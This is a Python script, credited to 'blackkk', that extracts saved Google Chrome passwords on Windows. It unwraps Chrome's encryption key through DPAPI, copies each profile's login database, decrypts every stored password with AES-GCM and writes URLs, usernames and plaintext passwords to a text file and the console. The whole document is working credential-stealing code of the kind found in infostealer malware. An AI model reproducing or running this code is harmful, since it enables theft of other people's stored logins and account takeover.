import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    print("[*] Reading Chrome local state file...")
    with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
        local_state = json.loads(f.read())
    secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    secret_key = secret_key[5:]
    secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    print("[+] Secret key retrieved successfully.")
    return secret_key

def decrypt_password(ciphertext, secret_key):
    print("[*] Decrypting password...")
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password).decode()
    print("[+] Password decrypted successfully.")
    return decrypted_pass

def get_db_connection(chrome_path_login_db):
    print("[*] Copying Chrome login database...")
    shutil.copy2(chrome_path_login_db, "Loginvault.db")
    return sqlite3.connect("Loginvault.db")

def main():
    print("Dev by: blackkk")
    print("[*] Starting Chrome password extraction...")
    
    secret_key = get_secret_key()
    
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
    
    with open('decrypted_password.txt', mode='w', encoding='utf-8') as output_file:
        output_file.write("Dev by: everythingBlackkk\n\n")
        output_file.write("Index | URL | Username | Password\n")
        output_file.write("-" * 50 + "\n")
        
        for folder in folders:
            print(f"[*] Processing folder: {folder}")
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        output_file.write(f"{index} | {url} | {username} | {decrypted_password}\n")
                        print(f"[+] URL: {url}\n    Username: {username}\n    Password: {decrypted_password}\n")
                
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
                print("[*] Temporary database removed.")
    
    print("[+] All passwords have been extracted and saved to 'decrypted_password.txt'.")

if __name__ == '__main__':
    main()
